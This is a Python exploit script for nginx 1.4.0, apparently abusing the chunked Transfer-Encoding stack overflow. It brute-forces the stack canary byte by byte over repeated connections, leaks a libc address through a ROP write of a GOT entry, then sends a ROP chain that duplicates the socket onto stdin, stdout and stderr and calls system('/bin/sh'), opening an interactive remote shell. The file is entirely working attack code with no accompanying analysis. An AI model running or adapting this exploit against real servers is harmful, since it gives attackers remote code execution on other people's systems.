#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './nginx-1.4.0_amd64'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

target = {'host':'localhost', 'port':8080}

#==========

binf = ELF(bin_file)
addr_got_main       = binf.got['__libc_start_main']

libc = binf.libc
offset_libc_main        = libc.sep_function['__libc_start_main']

#==========

def attack(conn, **kwargs):
    addr_libc_str_sh    = next(libc.search('/bin/sh'))

    rop = ROP(libc)
    rop.dup2(3, constants.STDIN_FILENO)
    rop.dup2(3, constants.STDOUT_FILENO)
    rop.dup2(3, constants.STDERR_FILENO)
    rop.system(addr_libc_str_sh)

    exploit  = p64(kwargs['canary'])
    exploit += p64(0)*5
    exploit += str(rop)
    send_exploit(conn, exploit)

def detect_libc(conn, **kwargs):
    rop = ROP(binf)
    rop.write(3, addr_got_main)

    exploit  = p64(kwargs['canary'])
    exploit += p64(0)*5
    exploit += str(rop)
    send_exploit(conn, exploit)

    addr_libc_main = u64(conn.recv(8))
    libc.address = addr_libc_main - offset_libc_main
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

def detect_canary():
    canary = [0]

    comn = Communicate('SOCKET', quiet=True, **target)
    for _ in range(7):
        comn.connect()
        with log.progress('Detecting canary... ') as p:
            if not comn.repeat(try_canary, 1, range(0, 0x100), canary=canary, log=p):
                fail('Canary not found')
        # kill server
        send_exploit(comn.connection, p64(0xdeadbeef))

    canary = u64(''.join(map(chr, canary)))
    success('canary     = 0x%016x' % canary)
    return canary

def try_canary(conn, **kwargs):
    canary      = kwargs['canary']
    cand_canary = kwargs['rep_arg'][0]

    kwargs['log'].status("Trying 0x%02x" % cand_canary)

    # maybe throw except
    send_exploit(conn, ''.join(map(chr, canary+[cand_canary])))
    conn.recv()

    canary += [cand_canary]
    info('leak canary : 0x%02x' % cand_canary)

def send_exploit(conn, exploit):
    req  = '''
GET / HTTP/1.1\r
Host: localhost\r
Transfer-Encoding: chunked\r
    '''.strip()
    req += '\r\n\r\n'

    req  = req.ljust(0x400, 'e')
    req += 'X'*0x1008

    conn.send(req+exploit)

#==========

if __name__=='__main__':
    canary = detect_canary()
    # canary = 0x685f1427fc073200

    comn = Communicate('SOCKET', **target)
    comn.connect()
    comn.run(detect_libc, canary=canary)

    comn.connect()
    comn.run(attack, canary=canary)

    comn.connection.interactive()

#==========
